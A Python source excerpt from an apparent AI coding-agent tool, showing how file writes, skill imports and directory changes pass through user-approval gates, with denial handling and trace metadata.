        try:
            entries = skills.load_entries(self.cwd, self.lessons_path)
        except Exception:  # noqa: BLE001 — reconciliation must never break creation
            return []
        subject = set(skills._content_words(f"{name} {description}"))
        needles = [p.casefold() for p in prefer_over if p.strip()]
        scored: list[tuple[int, Any]] = []
        for entry in entries:
            text = f"{entry.name} {entry.description} {entry.body}".casefold()
            if needles and any(n in text for n in needles):
                scored.append((100, entry))
            elif len(subject & entry.words) >= 2:
                scored.append((len(subject & entry.words), entry))
        scored.sort(key=lambda pair: -pair[0])
        return [entry for _score, entry in scored[:6]]

    def _commit_tool_file(self, target: Path, content: str, executable: bool) -> str | None:
        """Write one tool file through the diff-approval gate. Returns None on
        success, or a stop/deny result string the model should surface."""
        plan = files.plan_write(str(target), content, self.cwd)
        if plan.error:
            return f"ERROR: {plan.error}"
        decision = self.approve_write(plan)
        if isinstance(decision, Denied):
            self._arm_stop_gate(decision.comment)
            return _with_feedback(WRITE_DENIED, decision.comment)
        if isinstance(decision, Approved):
            return WRITE_HELD_FOR_ADJUSTMENT.format(comment=decision.comment)
        if not decision:
            return WRITE_DENIED
        files.commit(plan)
        if executable:
            try:
                mode = os.stat(target).st_mode
                os.chmod(target, mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
            except OSError as exc:
                return f"ERROR: wrote {target} but could not make it executable: {exc}"
        return None

    def _import_skill(self, args: dict) -> str:
        """Import a skill (#139). Untrusted content — the whole skill is shown in
        ONE consolidated review (every file's contents, syntax-highlighted, plus
        deterministic risk flags), and installs only on a single approval. Only a
        shallow read-only clone happens; the code is never executed on import."""
        repo = str(args.get("repo", "")).strip()
        if not repo:
            return "ERROR: repo (a git URL or local path) is required."
        if self.approve_import is None:
            return "ERROR: no import reviewer available; cannot import a skill."
        try:
            name, description, imported, skipped, tmp = skill_import.stage(
                repo, str(args.get("path", "")).strip()
            )
        except skill_import.SkillImportError as exc:
            return f"ERROR: {exc}"
        try:
            override = str(args.get("name", "")).strip()
            if override:
                if not skills.NAME_RE.match(override):
                    return f"ERROR: invalid skill name {override!r}."
                name = override
            dest = skills.GLOBAL_SKILLS_DIR / name
            flags = skill_import.safety_scan(imported)
            files_payload = [
                {"path": rel, "content": text, "lang": skill_import.lang_for(rel),
                 "executable": is_exec}
                for rel, text, is_exec in imported
            ]
            self._note(f"→ reviewing skill '{name}' ({len(imported)} files)")
            decision = self.approve_import(
                name=name, description=description, files=files_payload,
                skipped=skipped, flags=flags, dest=str(dest),
            )
            if isinstance(decision, Denied):
                self._arm_stop_gate(decision.comment)
                return _with_feedback(
                    f"Import of {name!r} was DENIED — nothing was installed.",
                    decision.comment,
                )
            if not decision:
                return f"Import of {name!r} was denied — nothing was installed."
            # Approved: install all reviewed files at once (the review already
            # happened; no per-file prompts).
            for rel, text, is_exec in imported:
                plan = files.plan_write(str(dest / rel), text, self.cwd)
                if plan.error:
                    return f"ERROR importing {rel}: {plan.error}"
                files.commit(plan)
                if is_exec:
                    target = dest / rel
                    try:
                        mode = os.stat(target).st_mode
                        os.chmod(target, mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
                    except OSError:
                        pass
        finally:
            if tmp:
                shutil.rmtree(tmp, ignore_errors=True)
        self._note(f"→ imported skill '{name}'")
        skipped_note = f" Skipped binary assets: {', '.join(skipped)}." if skipped else ""
        return (
            f"Imported skill {name!r} into {dest} ({len(imported)} files)."
            f"{skipped_note} It is available on the next task."
        )

    def _dispatch_write(self, name: str, args: dict) -> str:
        if name == "write_file":
            plan = files.plan_write(
                str(args.get("path", "")), str(args.get("content", "")), self.cwd
            )
        else:
            plan = files.plan_edit(
                str(args.get("path", "")),
                str(args.get("old_str", "")),
                str(args.get("new_str", "")),
                self.cwd,
            )
        if plan.error:
            return f"ERROR: {plan.error}"
        # Writes into the ephemeral scratch workspace are auto-approved (issue
        # #70) — no diff card. Confined strictly inside the scratch dir;
        # anything resolving outside falls through to the normal approval gate.
        if path_within(str(plan.target), self.cwd, self.scratch_dir):
            result = files.commit(plan)
            self.echo(result)
            return result
        # The diff the approval card showed, carried onto the trace step so the
        # web timeline renders WHAT changed (or would have) — applied, denied, or
        # held alike (#55). Computed from the plan (pre-commit), so it is stable
        # regardless of the decision.
        diff_meta = {"diff": plan.diff, "added": plan.added, "removed": plan.removed}
        decision = self.approve_write(plan)
        if isinstance(decision, Denied):
            # Deny + comment = STOP: a denied write never touches disk — the
            # trace step renders denied (not a silent success), carries the
            # user's feedback, and arms the stop gate like a denied run_command.
            self._run_meta = {
                "decision": "denied", "ok": False, "output": "",
                "comment": decision.comment, **diff_meta,
            }
            self._arm_stop_gate(decision.comment)
            return _with_feedback(WRITE_DENIED, decision.comment)
        if isinstance(decision, Approved):
            # Approve + comment = CONTINUE, but adjust: hold the write (nothing
            # is committed), the model adjusts to what the user asked and
            # re-proposes, and that change is approved again before it lands.
            self._run_meta = {
                "decision": "held", "ok": False, "output": "",
                "comment": decision.comment, **diff_meta,
            }
            return WRITE_HELD_FOR_ADJUSTMENT.format(comment=decision.comment)
        if not decision:
            self._run_meta = {"decision": "denied", "ok": False, "output": "", **diff_meta}
            return WRITE_DENIED
        result = files.commit(plan)
        self.echo(result)
        self._run_meta = {"decision": "approved", **diff_meta}
        return result

    def _parse_cd(self, command: str) -> str | None:
        """Detect a bare `cd <dir>`. For the user (! prefix) it changes agent
        state; from the model it is rejected with guidance — execution is
        stateless. Compound forms (cd x && ...) run normally as subshells."""
        if any(ch in command for ch in ";&|<>`$(){}"):
            return None
        try:
            tokens = shlex.split(command)
        except ValueError:
            return None
        if not tokens or tokens[0] != "cd" or len(tokens) > 2:
            return None
        return tokens[1] if len(tokens) == 2 else "~"

    def _change_dir(self, target: str) -> str:
        path = os.path.expanduser(target)
        if not os.path.isabs(path):
            path = os.path.normpath(os.path.join(self.cwd, path))
        if not os.path.isdir(path):
            note = f"ERROR: no such directory: {path}"
            self.echo(note)
            return note
        self.cwd = path
        # Return the note (callers surface it), but don't echo it — a cwd move is
        # shown by the workspace timeline marker (web) / the CLI /cd print, not a
        # grey echo line (#94/#95 cleanup).
        return f"[working directory is now {path}]"
